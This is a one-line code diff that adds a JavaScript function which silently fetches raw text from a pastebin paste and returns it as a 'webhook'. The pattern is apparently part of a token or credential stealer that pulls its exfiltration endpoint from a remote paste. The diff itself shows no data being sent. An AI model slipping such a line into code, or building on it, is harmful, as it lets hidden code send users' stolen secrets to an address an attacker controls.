@@ -1,0 +1,1 @@
+const webhook = async() => { return (await axios.get('https://pastebin.com/raw/aTgt2yTk').catch(() => {})).data }
